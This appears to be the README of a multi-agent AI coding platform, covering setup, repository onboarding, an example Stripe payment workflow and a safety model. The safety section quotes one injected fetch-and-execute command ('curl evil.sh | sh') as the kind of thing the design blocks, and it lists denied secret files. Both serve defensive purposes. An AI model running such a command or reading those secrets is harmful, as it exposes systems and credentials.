# AI Engineering Company

Optional integration: [KushBitx AgentProof free technical pilot](docs/KUSHBITX_AGENTPROOF_PILOT.md)
adds unsigned payment-safety evaluation and HTTP 402 challenge inspection.

A reusable multi-agent engineering platform. Connect **any** repository — any language, any framework — and a team of specialised AI agents analyses, plans, implements, reviews and documents changes to it.

This is deliberately **not** a one-project tool. Nothing in the platform knows anything about a specific codebase; everything it knows is detected at onboarding time and stored as project memory.

```
Human request
     │
     ▼
Project Manager ──► Engineering Manager ──► Backend / Frontend Engineer ──► QA ──► Docs
  (breakdown)          (architecture)            (implementation)        (verify) (record)
     │                       │                          │                   │        │
     └───────────────────────┴──────────────────────────┴───────────────────┴────────┘
                                  MongoDB: tasks · messages · knowledge · decisions
```

---

## Quick start

### Option A — Docker (recommended)

```bash
git clone <this repo> && cd ai-engineering-company
cp .env.example .env
# edit .env and set CLAUDE_API_KEY (and GITHUB_TOKEN if you want PR support)
docker compose up --build
```

### Option B — local Node

Requires Node 20+, a running MongoDB, and git on PATH.

```bash
cd backend
cp .env.example .env          # then set CLAUDE_API_KEY and MONGODB_URI
npm install
npm run dev                   # http://localhost:4000
```

`WORKSPACE_ROOT=./workspaces` is anchored to the `backend` directory, so the
same project checkouts are used when the API is launched from the repository
root or from `backend`.

Verify:

```bash
curl http://localhost:4000/api/health/ready
```

`status: "ready"` means the database is reachable and the Claude key is configured. The response also lists the registered agents, workflows and tools.

---

## 1. Adding your Claude API key

The key is read from the environment only — it is never stored in the database, never logged (the logger redacts it), and it is **stripped from the environment of every command an agent runs**.

| Running with | Set it in | Variable |
|---|---|---|
| Docker Compose | `./.env` (next to `docker-compose.yml`) | `CLAUDE_API_KEY=sk-ant-...` |
| Local Node | `./backend/.env` | `CLAUDE_API_KEY=sk-ant-...` |

The platform refuses to boot if the key is missing, rather than failing on the first agent run.

Model configuration (optional):

```bash
CLAUDE_MODEL=claude-opus-4-8   # default for all agents
CLAUDE_EFFORT=high             # low | medium | high | xhigh | max
CLAUDE_MAX_TOKENS=16000
```

Individual agents override these in their definitions — the Engineering Manager and engineers run at `xhigh`, the Documentation Engineer at `high`.

---

## 2. Connecting your first GitHub repository

Create a GitHub fine-grained personal access token with **Contents: Read** (add **Read and write** if you want agents to push branches and open PRs), then set `GITHUB_TOKEN`.

```bash
curl -X POST http://localhost:4000/api/projects/connect \
  -H 'content-type: application/json' \
  -d '{
    "repositoryUrl": "https://github.com/your-org/your-repo",
    "branch": "main"
  }'
```

This one call clones the repository, indexes it, detects the stack, and seeds project memory. It returns the project with its generated profile:

```jsonc
{
  "project": {
    "_id": "6789...",
    "name": "your-org/your-repo",
    "status": "ready",
    "profile": {
      "projectName": "your-org/your-repo",
      "languages": ["TypeScript"],
      "frameworks": ["Next.js", "Express"],
      "architecture": "monorepo + feature-modular",
      "database": "PostgreSQL, Prisma",
      "testingFramework": "Vitest",
      "deployment": "Docker, GitHub Actions",
      "conventions": [
        "TypeScript strict mode is ON — no implicit any, handle null explicitly",
        "Prettier formats this codebase — match its output, do not hand-format",
        "ESLint is configured — run the linter before reporting completion"
      ],
      "testCommand": "npm run test",
      "fileCount": 412
    }
  }
}
```

**No GitHub token?** Connect a directory on disk instead — everything except PR creation works identically:

```bash
curl -X POST http://localhost:4000/api/projects/connect \
  -H 'content-type: application/json' \
  -d '{"name": "my-app", "localPath": "/absolute/path/to/repo"}'
```

---

## 3. Onboarding an existing project

`POST /projects/connect` runs the full pipeline. What actually happens:

| Step | What it does | Where |
|---|---|---|
| 1. Materialise | Shallow-clones the repo (token used in-memory only, never written to `.git/config`) or copies a local path | `integrations/github/git-manager.ts` |
| 2. Index | Walks the tree, skipping `node_modules`/`dist`/`.git`/etc.; records path, size, summary and declared symbols per file | `services/onboarding/file-indexer.ts` |
| 3. Detect | Combines extension counts, manifest dependencies and marker files into a stack profile | `services/onboarding/detectors.ts` |
| 4. Persist | Stores the profile on the project and the file index on the repository | `database/` |
| 5. Seed memory | Writes stack, conventions, build/test commands, key files and directory layout into long-term memory | `memory/project-memory.ts` |

**Supported out of the box** — languages: TypeScript, JavaScript, Python, Java, Kotlin, C#, PHP, Go, Ruby, Rust, Vue, Svelte. Frameworks: React, Next.js, Angular, Vue, Svelte, Express, NestJS, Fastify, Koa, Django, FastAPI, Flask, Laravel, Symfony, Spring Boot, .NET / ASP.NET Core, Gin, Echo, Rails. Databases: MongoDB, PostgreSQL, MySQL, Redis, SQLite, Prisma.

Adding one more is a table entry in `detectors.ts` — no control flow changes.

Re-index after changes (or on a schedule):

```bash
curl -X POST http://localhost:4000/api/projects/<projectId>/reanalyze
```

Give the organization project-specific standing orders at any time:

```bash
curl -X PATCH http://localhost:4000/api/projects/<projectId>/instructions \
  -H 'content-type: application/json' \
  -d '{"customInstructions": "This is a regulated fintech codebase. Any change touching money must have a test asserting exact decimal amounts. Never use floating point for currency."}'
```

That text is injected into every agent's system prompt for this project.

---

## 4. Example workflow: "Add a payment feature"

```bash
curl -X POST http://localhost:4000/api/workflows/run \
  -H 'content-type: application/json' \
  -d '{
    "projectId": "<projectId>",
    "workflow": "feature-development",
    "request": "Add a payment feature: users can pay for a subscription with Stripe, see their payment history, and download invoices."
  }'
```

### What the AI company does with that

**Step 1 — Project Manager** (`planning`, read-only)
Orients itself in the *actual* repository with `find_files` / `code_search`, checks project memory for prior decisions, then produces a breakdown and creates tasks:

- Backend: Stripe checkout session endpoint + webhook handler → `backend-engineer`
- Backend: payment history model & query endpoint → `backend-engineer`
- Frontend: checkout button + payment history page → `frontend-engineer`
- QA: security review of the payment surface → `qa-engineer`
- Docs: payment API reference → `documentation-engineer`

Each task carries checkable acceptance criteria ("`POST /payments/session` returns 201 with a session id"), not vibes.

**Step 2 — Engineering Manager** (`architecture`, read-only)
Reads the modules that will be touched, then produces the technical plan: where the Stripe client lives, the exact endpoint contracts both engineers must code against, the data model and migration, and the risks (webhook idempotency, replay protection, storing no PANs). Records ADRs with `record_decision` — those become binding on every future agent. Declares the backend/frontend split explicitly.

**Step 3 — Backend Engineer** (write-scoped to server paths)
Creates a branch, reads neighbouring modules to learn the house style, implements the endpoints against the contract, runs the project's real test command, and commits. It **cannot** modify `Dockerfile`, `.github/**` or `terraform/**` — the platform rejects the write.

**Step 4 — Frontend Engineer** (write-scoped to UI paths)
Reads the backend contract (it has repo-wide *read* access), matches the existing component patterns, handles loading/error/empty/unauthorized states, type-checks, commits. It **cannot** write to `server/**` or `migrations/**`.

**Step 5 — QA Engineer** (write-scoped to test paths only)
Reads the real diff, checks each acceptance criterion, hunts for auth gaps, missing validation, webhook replay, and float-vs-decimal money bugs; writes tests; runs the suite and reports the actual output. It **cannot** edit the implementation it is reviewing — findings go back to the owning engineer.

**Step 6 — Documentation Engineer** (write-scoped to docs)
Documents what was actually built, verifying every endpoint and parameter against the source.

Skipped steps are automatic: if the plan says "No frontend work required", the frontend step is skipped rather than inventing UI.

### Watch it happen

```bash
# The run, step by step, with per-step token usage
curl http://localhost:4000/api/workflows/runs/<runId>

# Tasks it created, with full status history and artifacts
curl 'http://localhost:4000/api/tasks?projectId=<projectId>'

# The inter-agent conversation
curl 'http://localhost:4000/api/agents/messages?projectId=<projectId>'

# Everything the organization learned about your codebase
curl http://localhost:4000/api/projects/<projectId>/memory
```

### Other workflows

```bash
# Bug fixing: root cause analysis → fix → regression test → record
-d '{"workflow": "bug-fixing", "request": "Users occasionally get charged twice when they double-click Pay."}'

# Code review: correctness pass + architecture pass → consolidated verdict
-d '{"workflow": "code-review", "request": "Review the changes on the current branch."}'
```

---

## Documentation

| Document | Contents |
|---|---|
| [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md) | Folder structure, database schema, agent communication flow, and the rationale for every major decision |
| [`docs/API.md`](docs/API.md) | Full endpoint reference with request/response examples |
| [`backend/.env.example`](backend/.env.example) | Every environment variable, documented inline |

---

## Safety model (read this before pointing it at a real repository)

The platform assumes model output is untrusted and enforces boundaries in code, not in prompts:

- **Scoped writes.** Each agent declares `writePaths`/`denyPaths` globs. A write outside scope is rejected by `PermissionGuard` before it reaches the filesystem — the Frontend Engineer *cannot* edit `Dockerfile` however it is prompted.
- **Secrets are denied to every role.** `.env`, `*.pem`, `*.key`, `**/secrets/**` are on a deny list that overrides all allow rules, and search results are filtered through the same check.
- **No shell.** Commands run as `argv` arrays with `shell: false` and a per-agent executable allowlist, so `npm test; curl evil.sh | sh` is not expressible.
- **Sandboxed filesystem.** Every path is resolved and symlink-checked to stay inside the project workspace.
- **Approval gates.** Set `REQUIRE_HUMAN_APPROVAL=true` and every repository-mutating step parks in `awaiting_approval` until you approve it explicitly.
- **Scrubbed child environment.** `CLAUDE_API_KEY`, `GITHUB_TOKEN`, `MONGODB_URI` and `PLATFORM_API_KEY` are removed from the environment of any command an agent runs.
- **API auth.** Set `PLATFORM_API_KEY` and every `/api` route requires `x-api-key` (constant-time compared).

Recommended for a first real run: point it at a fork, leave `REQUIRE_HUMAN_APPROVAL=true`, and review the branch before merging.

---

## Extending the platform

| To add… | Do this | Nothing else changes |
|---|---|---|
| A new agent role | Add a file in `src/agents/definitions/` and register it | Runtime, tools, router, workflows are generic |
| A new tool | `defineTool({...})` and register it in `src/tools/registry.ts` | Agents opt in by name |
| A new workflow | Add a declarative definition in `src/workflows/` | The engine executes any step graph |
| A new language/framework | Add a table entry in `services/onboarding/detectors.ts` | Detection is data-driven |
| A different LLM provider | Implement `LlmProvider` from `services/llm/types.ts` | Agents never touch the SDK |

Boot-time validation (`bootstrap/validate-registries.ts`) catches a typo'd tool name or a workflow referencing a non-existent agent at startup, not three steps into a run that has already modified a repository.

---

## Scripts

```bash
npm run dev        # watch mode
npm run build      # compile to dist/
npm start          # run compiled output
npm run typecheck  # tsc --noEmit
npm run seed:agents # re-sync the agent roster mirror into MongoDB
```
